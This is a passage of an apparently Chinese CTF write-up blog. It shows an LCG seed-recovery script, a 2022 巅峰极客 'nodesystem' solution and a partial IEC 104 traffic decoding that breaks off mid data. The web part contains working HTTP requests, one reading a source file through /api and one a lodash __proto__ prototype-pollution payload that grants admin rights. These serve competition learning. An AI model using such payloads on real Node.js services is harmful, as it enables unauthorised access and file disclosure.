class="comment"># num3 - b = a * num2 mod N</span></span><br><span class="line"><span class="comment"># num2 - num1 = a * (num1 - seed) mod N</span></span><br><span class="line"><span class="comment"># num3 - num2 = a * (num2 - num1) mod N</span></span><br><span class="line"><span class="comment"># a = (num3 - num2) * invert(num2 - num1, N) % N</span></span><br><span class="line"><span class="comment"># seed = (num1 - (num2 - num1) * invert(a, N)) % N</span></span><br><span class="line"><span class="comment"># print(seed)</span></span><br><span class="line"></span><br><span class="line">num1 = <span class="number">18130822956452391991955329698533874329587224661240216580076844046347888170896</span></span><br><span class="line">num2 = <span class="number">40689348136688527650286917072116617946360334296435621222913550590709120711790</span></span><br><span class="line">num3 = <span class="number">9024218577699321126393149839649183482718782671341152454962950979591052427336</span></span><br><span class="line">num4 = <span class="number">50380931324746679713270700564952245173255615647824411192603253345164761384621</span></span><br><span class="line">num5 = <span class="number">12990849833536354231958759537534231189033734453933764867420622046266758809753</span></span><br><span class="line">num6 = <span class="number">3319681046644313401014467521203728557012218039251416119690694719681592633926</span>  <span class="comment"># num1 = a * seed % N + b mod N</span></span><br><span class="line"><span class="comment"># num2 = a * num1 % N + b mod N</span></span><br><span class="line"><span class="comment"># num3 = a * num2 % N + b mod N</span></span><br><span class="line"><span class="comment"># num4 = a * num3 % N + b mod N</span></span><br><span class="line"><span class="comment"># num5 = a * num4 % N + b mod N</span></span><br><span class="line"><span class="comment"># num6 = a * num5 % N + b mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num1 - b = a * seed mod N</span></span><br><span class="line"><span class="comment"># num2 - b = a * num1 mod N</span></span><br><span class="line"><span class="comment"># num3 - b = a * num2 mod N</span></span><br><span class="line"><span class="comment"># num4 - b = a * num3 mod N</span></span><br><span class="line"><span class="comment"># num5 - b = a * num4 mod N</span></span><br><span class="line"><span class="comment"># num6 - b = a * num5 mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num6 - num5 = a * (num5 - num4) mod N</span></span><br><span class="line"><span class="comment"># num5 - num4 = a * (num4 - num3) mod N</span></span><br><span class="line"><span class="comment"># num4 - num3 = a * (num3 - num2) mod N</span></span><br><span class="line"><span class="comment"># num3 - num2 = a * (num2 - num1) mod N</span></span><br><span class="line"><span class="comment"># num2 - num1 = a * (num1 - seed) mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t6 = a * t5 mod N</span></span><br><span class="line"><span class="comment"># t5 = a * t4 mod N</span></span><br><span class="line"><span class="comment"># t4 = a * t3 mod N</span></span><br><span class="line"><span class="comment"># t3 = a * t2 mod N</span></span><br><span class="line"><span class="comment"># t2 = a * t1 mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t6 * t4 = a * a * t5 * t3 mod N</span></span><br><span class="line"><span class="comment"># t5 * t5 = a * a * t4 * t4 mod N</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t5 * t5 - t6* t4 = (a*a*t4*t4 - a*a*t4*t4) mod N = 0 mod N</span></span><br><span class="line">t6 = num6 - num5</span><br><span class="line">t5 = num5 - num4</span><br><span class="line">t4 = num4 - num3</span><br><span class="line">t3 = num3 - num2</span><br><span class="line">t2 = num2 - num1</span><br><span class="line">g1 = gcd(t6 * t4 - t5 * t5, t5 * t3 - t4 * t4)</span><br><span class="line">g2 = gcd(t5 * t3 - t4 * t4, t4 * t2 - t3 * t3)</span><br><span class="line"><span class="built_in">print</span>(g1, g2)</span><br><span class="line"><span class="built_in">print</span>(gcd(g1, g2))</span><br><span class="line">N = g2</span><br><span class="line">a = (num3 - num2) * invert(num2 - num1, N) % N</span><br><span class="line">seed = (num1 - (num2 - num1) * invert(a, N)) % N</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">    io = remote(<span class="string">&quot;192.168.1.105&quot;</span>, <span class="number">19999</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;This is the challenge1,you need solve 50 times\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;a=&quot;</span>)</span><br><span class="line">        a = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;b=&quot;</span>)</span><br><span class="line">        b = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;N=&quot;</span>)</span><br><span class="line">        N = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;num1=&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;seed = &quot;</span>)</span><br><span class="line">        seed = (num1 - b) * invert(a, N) % N</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(seed).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;This is the challenge2,you need solve 30 times\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;a=&quot;</span>)</span><br><span class="line">        a = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;N=&quot;</span>)</span><br><span class="line">        N = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;num1=&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;num2=&quot;</span>)</span><br><span class="line">        num2 = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;seed = &quot;</span>)</span><br><span class="line">        seed = (num1 - (num2 - num1) * invert(a, N)) % N</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(seed).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;This is the challenge3,you need solve 20 times\n&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;N=&quot;</span>)</span><br><span class="line">        N = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;num1=&quot;</span>)</span><br><span class="line">        num1 = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;num2=&quot;</span>)</span><br><span class="line">        num2 = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;num3=&quot;</span>)</span><br><span class="line">        num3 = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;seed = &quot;</span>)</span><br><span class="line">        a = (num3 - num2) * invert(num2 - num1, N) % N</span><br><span class="line">        seed = (num1 - (num2 - num1) * invert(a, N)) % N</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(seed).encode())</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="comment"># pwn()</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 巅峰极客 线上决赛 部分题解</title>
    <url>/2022-DFJK-Final/</url>
    <content><![CDATA[<p>还得看我<strong>PWN</strong>爷的，<strong>WEB</strong>啥也不是，还有这个闯关模式是真坐牢。</p>
<span id="more"></span>
<h1 id="web">Web</h1>
<h2 id="nodesystem">nodesystem</h2>
<p><strong>JS</strong>文件里有个提示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">api</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);        </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(result);&#125;       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/api&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> sendData = &#123;<span class="string">&quot;auth&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;, <span class="string">&quot;filename&quot;</span> : <span class="string">&quot;test.txt&quot;</span>&#125;;</span><br><span class="line">    xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(sendData));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>照着来一下，给了提示。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;ok&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;1. Add Login page.\r\n2. Update API.\r\n3. Add Delete User function.\r\n4. Complete Upload attachment feature.&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>发现可以读文件。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2zee4fhirxbfrwsxiwga.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://eci-2zee4fhirxbfrwsxiwga.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2zee4fhirxbfrwsxiwga.cloudeci1.ichunqiu.com/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span><span class="string">&quot;index.js&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
<p>拿到源码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;views&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> users = [</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;test&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="attr">name</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="attr">password</span>: <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">32</span>), <span class="attr">admin</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> messages = [];</span><br><span class="line"><span class="keyword">let</span> lastId = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findUser</span>(<span class="params">auth</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="function">(<span class="params">u</span>) =&gt;</span></span><br><span class="line">        u.<span class="property">name</span> === auth.<span class="property">name</span> &amp;&amp;</span><br><span class="line">        u.<span class="property">password</span> === auth.<span class="property">password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/users&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> lists = users;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;users&#x27;</span>, &#123;<span class="attr">lists</span>: lists, <span class="attr">pageTitle</span>: <span class="string">&#x27;List of Users&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/users&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123;<span class="attr">pageTitle</span>: <span class="string">&#x27;Home&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    users.<span class="title function_">push</span>(&#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>, <span class="attr">password</span>: req.<span class="property">body</span>.<span class="property">password</span>&#125;);</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/users&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/message&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(messages);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">put</span>(<span class="string">&#x27;/message&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>.<span class="property">auth</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br><span class="line">    <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> message = &#123;</span><br><span class="line">        <span class="attr">avator</span>: <span class="string">&#x27;= =&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    _.<span class="title function_">merge</span>(message, req.<span class="property">body</span>.<span class="property">message</span>, &#123;</span><br><span class="line">        <span class="attr">id</span>: lastId++,</span><br><span class="line">        <span class="attr">userName</span>: user.<span class="property">name</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    messages.<span class="title function_">push</span>(message);</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">message</span>: message&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">delete</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line">    <span class="keyword">if</span> (!user) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    filename = req.<span class="property">body</span>.<span class="property">filename</span>;</span><br><span class="line">    testFolder = <span class="string">&quot;/app/&quot;</span>;</span><br><span class="line">    fs.<span class="title function_">readdirSync</span>(testFolder).<span class="title function_">forEach</span>(<span class="function"><span class="params">file</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="title function_">indexOf</span>(filename) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> buffer = fs.<span class="title function_">readFileSync</span>(filename).<span class="title function_">toString</span>();</span><br><span class="line">            res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">content</span>: buffer&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/debug&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">auth</span> || &#123;&#125;);</span><br><span class="line">    <span class="keyword">if</span> (!user || !user.<span class="property">admin</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="string">&#x27;Access denied&#x27;</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> buffer = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;<span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">content</span>: buffer&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Listening port 80&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>merge</strong>原型链污染，给<strong>message</strong>一个<strong>put</strong>请求构造一个<strong>admin</strong>账号，污染为<strong>admin:
true</strong>即可。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/message</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>eci-2zee4fhirxbfrwsxiwga.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://eci-2zee4fhirxbfrwsxiwga.cloudeci1.ichunqiu.com</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://eci-2zee4fhirxbfrwsxiwga.cloudeci1.ichunqiu.com/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;auth&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;admin&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
<p>然后直接去等登陆这个账号。</p>
<h1 id="misc">Misc</h1>
<h2 id="babyprotocol">babyprotocol</h2>
<p><strong>ICE</strong>协议分析，早在<strong>2020</strong>年出过类似的。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">Frame</span> <span class="string">221: 64 bytes on wire (512 bits), 64 bytes captured (512 bits) on interface \Device\NPF_Loopback, id 0</span></span><br><span class="line"><span class="attr">Null/Loopback</span></span><br><span class="line"><span class="attr">Internet</span> <span class="string">Protocol Version 4, Src: 127.0.0.1, Dst: 127.0.0.1</span></span><br><span class="line"><span class="attr">Transmission</span> <span class="string">Control Protocol, Src Port: 2404, Dst Port: 62121, Seq: 7, Ack: 7, Len: 20</span></span><br><span class="line"><span class="attr">IEC</span> <span class="string">60870-5-104: -&gt; I (0,1) </span></span><br><span class="line"><span class="attr">IEC</span> <span class="string">60870-5-101/104 ASDU: ASDU=1541 M_IT_NA_1 Spont   IOA=1 &#x27;integrated totals&#x27;</span></span><br><span class="line">    <span class="attr">TypeId</span>: <span class="string">M_IT_NA_1 (15)</span></span><br><span class="line">    <span class="attr">0...</span> <span class="string">.... = SQ: False</span></span><br><span class="line">    <span class="attr">.000</span> <span class="string">0001 = NumIx: 1</span></span><br><span class="line">    <span class="attr">..00</span> <span class="string">0011 = CauseTx: Spont (3)</span></span><br><span class="line">    <span class="attr">.0..</span> <span class="string">.... = Negative: False</span></span><br><span class="line">    <span class="attr">0...</span> <span class="string">.... = Test: False</span></span><br><span class="line">    <span class="attr">OA</span>: <span class="string">0</span></span><br><span class="line">    <span class="attr">Addr</span>: <span class="string">1541</span></span><br><span class="line">    <span class="attr">IOA</span>: <span class="string">1</span></span><br><span class="line">        <span class="attr">IOA</span>: <span class="string">1</span></span><br><span class="line">        <span class="attr">Binary</span> <span class="string">Counter: 102</span></span><br><span class="line">        <span class="attr">...1</span> <span class="string">1011 = SQ: 27</span></span><br><span class="line">        <span class="attr">..0.</span> <span class="string">.... = CY: No overflow</span></span><br><span class="line">        <span class="attr">.0..</span> <span class="string">.... = CA: Not Adjusted</span></span><br><span class="line">        <span class="attr">0...</span> <span class="string">.... = IV: Valid</span></span><br></pre></td></tr></table></figure>
<p><strong>IOA</strong>的值是数据的位置，<strong>Binary
Counter</strong>的值是数据的<strong>ASCII</strong>值，<strong>IV</strong>是数据的有效性。</p>
<p>因此编写脚本取值，获取有效数据排序输出即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;&quot;&quot;680407000000</span></span><br><span class="line"><span class="string">68040b000000</span></span><br><span class="line"><span class="string">6812000002000f0103000506010000660000001b</span></span><br><span class="line"><span class="string">6812020002000f0103000506010000660000001c</span></span><br><span class="line"><span class="string">6812040002000f0103000506030000610000001b</span></span><br><span class="line"><span class="string">680401000600</span></span><br><span class="line"><span class="string">6812060002000f01030005060b0000640000001a</span></span><br><span class="line"><span class="string">6812080002000f0103000506080000620000001b</span></span><br><span class="line"><span class="string">68120a0002000f01030005060c0000390000001a</span></span><br><span class="line"><span class="string">680e00000c0064010601020000000014</span></span><br><span class="line"><span class="string">680e0c00020064014500020000000014</span></span><br><span class="line"><span class="string">68120e0002000f0103000506110000380000001b</span></span><br><span class="line"><span class="string">6812100002000f0103000506150000300000001a</span></span><br><span class="line"><span class="string">680401001200</span></span><br><span class="line"><span class="string">6812120002000f01030005061a00006500000018</span></span><br><span class="line"><span class="string">6812140002000f01030005061e00003800000017</span></span><br><span class="line"><span class="string">6812160002000f01030005062700003500000017</span></span><br><span class="line"><span class="string">6812180002000f01030005061800006400000017</span></span><br><span class="line"><span class="string">680401001a00</span></span><br><span class="line"><span class="string">68121a0002000f01030005060500007b0000001b</span></span><br><span class="line"><span class="string">68121c0002000f0103000506030000610000001c</span></span><br><span class="line"><span class="string">68121e0002000f01030005060500007b0000001c</span></span><br><span class="line"><span class="string">6812200002000f0103000506060000360000001b</span></span><br><span class="line"><span class="string">6812220002000f01030005060a0000340000001b</span></span><br><span class="line"><span class="string">6812240002000f01030005060c0000390000001b</span></span><br><span class="line"><span class="string">680401002600</span></span><br><span class="line"><span class="string">6812260002000f0103000506140000350000001b</span></span><br><span class="line"><span class="string">6812280002000f01030005061700003900000017</span></span><br><span class="line"><span class="string">68122a0002000f01030005061900006300000017</span></span><br><span class="line"><span class="string">68122c0002000f01030005061900006300000018</span></span><br><span class="line"><span class="string">68122e0002000f01030005061b00002d00000097</span></span><br><span class="line"><span class="string">680401003000</span></span><br><span class="line"><span class="string">6812300002000f01030005061c00006400000018</span></span><br><span class="line"><span class="string">6812320002000f01030005061e00003800000018</span></span><br><span class="line"><span class="string">6812340002000f01030005062700003500000018</span></span><br><span class="line"><span class="string">6812360002000f01030005061800006400000018</span></span><br><span class="line"><span class="string">680401003800</span></span><br><span class="line"><span class="string">680401000200</span></span><br><span class="line"><span class="string">6812380002000f0103000506040000670000001b</span></span><br><span class="line"><span class="string">68123a0002000f0103000506030000610000001d</span></span><br><span class="line"><span class="string">68123c0002000f0103000506040000670000001c</span></span><br><span class="line"><span class="string">68123e0002000f01030005060500007b0000001d</span></span><br><span class="line"><span class="string">680401004000</span></span><br><span class="line"><span class="string">6812400002000f0103000506060000360000001c</span></span><br><span class="line"><span class="string">6812420002000f0103000506070000380000001b</span></span><br><span class="line"><span class="string">6812440002000f0103000506080000620000001c</span></span><br><span class="line"><span class="string">6812460002000f0103000506090000330000001b</span></span><br><span class="line"><span class="string">680401004800</span></span><br><span class="line"><span class="string">6812480002000f01030005060d0000320000001b</span></span><br><span class="line"><span class="string">68124a0002000f01030005060e0000640000001b</span></span><br><span class="line"><span class="string">68124c0002000f01030005060a0000340000001c</span></span><br><span 